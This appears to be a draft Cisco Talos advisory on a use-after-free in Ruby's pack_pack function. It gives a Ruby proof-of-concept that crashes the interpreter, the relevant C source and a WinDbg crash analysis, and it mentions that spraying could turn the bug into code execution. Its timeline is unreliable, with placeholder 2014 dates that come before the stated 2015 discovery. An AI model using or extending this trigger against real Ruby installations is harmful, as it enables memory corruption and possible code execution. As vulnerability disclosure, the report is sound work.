Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby pack.c pack_pack function Use After Free vulnerability.

:: Description

	An exploitable User After Free vulnerability exists in the pack_pack function functionality of Ruby. 
In pack_pack function each element of array which should be "pack", based on template string is converted to binary representation in proper way. 
If element is not compatible with corresponding to him format, element is converted to proper form.
		Exploiting this knowledge and fact that size of array used later in iteration is taken before loop, 
specially constructed object can be passed as element of "ary" and during conversion to pointed by template string format clear "ary" array
triggering in next iteration Use After Free vulnerability.


:: Tested Versions

Ruby 2.3.0 dev
Ruby 2.2.2

:: Product URLs

https://www.ruby-lang.org


:: Details

Line 345	static VALUE
Line 346	pack_pack(VALUE ary, VALUE fmt)
Line 347	{

(...)
Line  361		StringValue(fmt);
Line  362		p = RSTRING_PTR(fmt);
Line  363		pend = p + RSTRING_LEN(fmt);
Line  364		res = rb_str_buf_new(0);
Line  365
Line  366		items = RARRAY_LEN(ary);
Line  367		idx = 0;
Line  368
Line  369	#define TOO_FEW (rb_raise(rb_eArgError, toofew), 0)
Line  370	#define THISFROM (items > 0 ? RARRAY_AREF(ary, idx) : TOO_FEW)
Line  371	#define NEXTFROM (items-- > 0 ? RARRAY_AREF(ary, idx++) : TOO_FEW)
Line  372
Line  373    while (p < pend) {
(...)
Line 452    switch (type) {
Line 453    case 'A':
Line 454    case 'a':
Line 455    case 'Z':
Line 456    case 'B':
Line 457    case 'b':
Line 458    case 'H':
Line 459    case 'h':
Line 460        from = NEXTFROM;
Line 461        if (NIL_P(from)) {
Line 462            ptr = "";
Line 463            plen = 0;
Line 464        }
Line 465        else {
Line 466            StringValue(from);
Line 467            ptr = RSTRING_PTR(from);
Line 468            plen = RSTRING_LEN(from);
Line 469            OBJ_INFECT(res, from);
Line 470        }

In Line 366 length of array contains elements to pack is taken. It's important to notice it that this length is read one time not each time during loop
iteration because later we will exploit that fact.
Next in Line 373 starts loop where each element from "ary" array is "pack" to coresponding form pointed by directives passed in "fmt" argument.
For an example I chose to use "A" directives. 
Line 460 take another element from "ary" and treating it according with directive as a string. Before any operation is made on "from" object
in Line 466 by calling StringValue function checks whether indeed "form" object is a String object. If "from" object is not a string
"to_str" method is executed if exists.
	Having those two facts that:
- "ary" object during iteration in while loop is not frozen and it's len was taken before loop, and now based on this value no matter whether 
array will be increased or decreased there will be so many iterations that specified in items variable.
- passing object not being String with custom "to_str" method gives possibility to manipulate e.g "ary" content
	Attacker can create object and pass it in "ary" array as element, which implements "to_str" method which main purpose is to clear "ary" elements causing in next iteration 
Use After Free vulnerability.
	In example of usage "A" directives in next iteration when "ary" elements are released in Line 466 appears attempt to call "to_str" method on
released memory. With proper spraying it can lead to code execution.
	Below PoC shows entire attack.

:: PoC

$a = []
class MyObject
	def to_str
		$a.clear()
		$a = nil
		GC.start
		#spray * spray * spray
		return "TALOS"
	end
end

$a.push(MyObject.new())
$a.push(".")

puts $a.pack("AA")


:: Crash analysis


0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** WARNING: Unable to verify checksum for ruby.exe

FAULTING_IP: 
msvcr120_ruby230!st_lookup+d [t:\projects\bugs\ruby_debug_x32\st.c @ 388]
674a6b1d 8b11            mov     edx,dword ptr [ecx]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 674a6b1d (msvcr120_ruby230!st_lookup+0x0000000d)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 00000006
Attempt to read from address 00000006

FAULTING_THREAD:  00001cac

DEFAULT_BUCKET_ID:  NULL_CLASS_PTR_READ

PROCESS_NAME:  ruby.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  00000006

READ_ADDRESS:  00000006 

FOLLOWUP_IP: 
msvcr120_ruby230!st_lookup+d [t:\projects\bugs\ruby_debug_x32\st.c @ 388]
674a6b1d 8b11            mov     edx,dword ptr [ecx]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

FAULTING_LOCAL_VARIABLE_NAME:  table

APP:  ruby.exe

PRIMARY_PROBLEM_CLASS:  NULL_CLASS_PTR_READ

BUGCHECK_STR:  APPLICATION_FAULT_NULL_CLASS_PTR_READ

LAST_CONTROL_TRANSFER:  from 67499c00 to 674a6b1d

STACK_TEXT:  
0041ef3c 67499c00 00000006 00000099 0041ef50 msvcr120_ruby230!st_lookup+0xd
0041ef58 67499baf 02978298 00000099 00000000 msvcr120_ruby230!lookup_method_table+0x20
0041ef6c 6748aaf7 02978298 00000099 0041ef84 msvcr120_ruby230!search_method+0x2f
0041ef90 6748a8a2 02978298 00000099 0041efd8 msvcr120_ruby230!rb_method_entry_get_without_cache+0x17
0041efb4 6749d318 02978298 00000099 0041efd8 msvcr120_ruby230!rb_method_entry+0xa2
0041efe4 674883a2 00620c08 02978298 029782ac msvcr120_ruby230!check_funcall_respond_to+0x18
0041f00c 674bad1e 029782ac 00000c41 00000000 msvcr120_ruby230!rb_check_funcall+0x32
0041f04c 674b827d 029782ac 676493cc 676493c4 msvcr120_ruby230!convert_type+0x9e
0041f068 674531f8 029782ac 00000005 676493cc msvcr120_ruby230!rb_convert_type+0x2d
0041f080 67453232 029782ac 029782ac 0041f34c msvcr120_ruby230!rb_str_to_str+0x18
0041f090 675a8335 0041f324 00000000 00000001 msvcr120_ruby230!rb_string_value+0x32
0041f34c 67490549 02978360 0296b69c 0041f424 msvcr120_ruby230!pack_pack+0x535
0041f35c 67491042 675a7e00 02978360 00000001 msvcr120_ruby230!call_cfunc_1+0x19
0041f424 674912bc 00620c08 001effd0 02a19a88 msvcr120_ruby230!vm_call_cfunc_with_frame+0x2b2
0041f438 67491592 00620c08 001effd0 02a19a88 msvcr120_ruby230!vm_call_cfunc+0x4c
0041f4dc 6748dc94 00620c08 001effd0 02a19a88 msvcr120_ruby230!vm_call_method+0xa2
0041f4f0 674953dc 00620c08 001effd0 02a19a88 msvcr120_ruby230!vm_call_general+0x14
0041fd10 6749b7a8 00620c08 00000000 02a18e98 msvcr120_ruby230!vm_exec_core+0x286c
0041fe04 6748aeb7 00620c08 67438553 00620d54 msvcr120_ruby230!vm_exec+0x98
0041fe1c 6743857e 0066bc8c 4300ee9d 00000000 msvcr120_ruby230!rb_iseq_eval_main+0x27
0041fec0 67437378 0066bc8c 0041fedc 67436b50 msvcr120_ruby230!ruby_exec_internal+0x10e
0041fecc 67436b50 0066bc8c 4341105d 0041feec msvcr120_ruby230!ruby_exec_node+0x18
0041fedc 0117103b 0066bc8c 00645558 0041ff2c msvcr120_ruby230!ruby_run_node+0x30
0041feec 01171261 00000002 00644e00 00645558 ruby!main+0x3b
0041ff2c 75b6337a 7efde000 0041ff78 774692e2 ruby!__tmainCRTStartup+0xfd
0041ff38 774692e2 7efde000 595f9671 00000000 kernel32!BaseThreadInitThunk+0xe
0041ff78 774692b5 011712c9 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0041ff90 00000000 011712c9 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


FAULTING_SOURCE_LINE:  t:\projects\bugs\ruby_debug_x32\st.c

FAULTING_SOURCE_FILE:  t:\projects\bugs\ruby_debug_x32\st.c

FAULTING_SOURCE_LINE_NUMBER:  388

FAULTING_SOURCE_CODE:  
   384: {
   385:     st_index_t hash_val;
   386:     register st_table_entry *ptr;
   387: 
>  388:     hash_val = do_hash(key, table);
   389: 
   390:     if (table->entries_packed) {
   391: 	st_index_t i = find_packed_index(table, hash_val, key);
   392: 	if (i < table->real_entries) {
   393: 	    if (value != 0) *value = PVAL(table, i);


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  msvcr120_ruby230!st_lookup+d

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: msvcr120_ruby230

IMAGE_NAME:  msvcr120-ruby230.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  5554e802

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  NULL_CLASS_PTR_READ_c0000005_msvcr120-ruby230.dll!st_lookup

BUCKET_ID:  APPLICATION_FAULT_NULL_CLASS_PTR_READ_DETOURED_msvcr120_ruby230!st_lookup+d

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/ruby_exe/2_3_0_0/5554e802/msvcr120-ruby230_dll/2_3_0_0/5554e802/c0000005/00076b1d.htm?Retriage=1

Followup: MachineOwner
---------

0:000> r
eax=00000099 ebx=00000000 ecx=00000006 edx=0041ef50 esi=00000001 edi=00000000
eip=674a6b1d esp=0041ef2c ebp=0041ef3c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
msvcr120_ruby230!st_lookup+0xd:
674a6b1d 8b11            mov     edx,dword ptr [ecx]  ds:002b:00000006=????????


:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: Timeline

2015-06-08 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure	